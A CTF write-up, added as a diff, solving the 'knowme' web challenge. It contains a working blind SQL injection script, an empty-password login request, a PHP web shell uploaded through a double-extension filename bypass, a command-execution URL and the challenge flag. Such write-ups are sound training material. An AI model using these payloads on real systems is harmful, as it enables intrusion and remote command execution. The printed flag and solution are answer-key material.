@@ -1,0 +1,74 @@
+for knowme:
+# Challenge
+Only someone that knows me can solve me
+
+Do you know me?
+
+[https://typhooncon-knowme.chals.io/](https://typhooncon-knowme.chals.io/)
+
+Flag format: SSD{...}
+
+## Solution
+```python
+import requests
+import string
+
+URL = "https://typhooncon-knowme.chals.io/items.php?sort="
+
+charset = string.ascii_lowercase + string.digits
+
+column_name = ['id', 'username', 'password', 'email']
+hash_pass = ''
+for index in range(0,32):
+    for i in charset:
+        trying = f"(select case when ((select ORD(SUBSTRING(password,{index+1},1)) FROM users WHERE username = 'admin') = {ord(i)}) then count else itemName end)"
+        print(trying)
+        r = requests.get(URL + trying)
+
+        if 'Labtop' in r.text:
+            hash_pass += i
+            print(hash_pass)
+            break
+```
+By using above script we'll have the admin password hash: `d41d8cd98f00b204e9800998ecf8427e`. After that we can change the reverse string for this hash eg. [here](https://md5.gromweb.com/?md5=d41d8cd98f00b204e9800998ecf8427e) and we'll see the result is an empty string. So next we can try to login as an admin but we'll have to add some char for the password because of the frontend check. On Burp we can bypass it and send request with empty string.
+```http
+POST /login.php HTTP/1.1
+Host: typhooncon-knowme.chals.io
+Content-Length: 17
+
+uname=admin&pswd=
+```
+After that we have a session and we can see [upload page](https://typhooncon-knowme.chals.io/profile.php). We can try to send the php shell - the file extension is checked so we send `shell.gif.php` as a file name.
+```http
+POST /upload.php HTTP/1.1
+Host: typhooncon-knowme.chals.io
+Cookie: PHPSESSID=ndoj4283rg97us1e38cko38u4a
+Content-Length: 243
+Cache-Control: max-age=0
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Upgrade-Insecure-Requests: 1
+Origin: https://typhooncon-knowme.chals.io
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBLSa05c1o3YSUF0J
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://typhooncon-knowme.chals.io/profile.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+------WebKitFormBoundaryBLSa05c1o3YSUF0J
+Content-Disposition: form-data; name="file"; filename="shell.gif.php"
+Content-Type: text/php
+
+<?php echo "<pre>"; system($_GET['id']); echo "</pre>"; ?>
+------WebKitFormBoundaryBLSa05c1o3YSUF0J--
+```
+After this request we have a shell on the system. We have to only find where it is. After investigation we can see our shell is [here](https://typhooncon-knowme.chals.io/uploads/shell.gif.php?id=). Finally we have to find where the flag is and go to the [url](https://typhooncon-knowme.chals.io/uploads/shell.gif.php?id=cat%20../../flag). As a result we have a flag: `SSD{9a0c843a03de8e257b1068a8659be56ac06991f3}`
+
+#md5 #blind #sqli #blindsqli #php #phpshell #shell #uploader
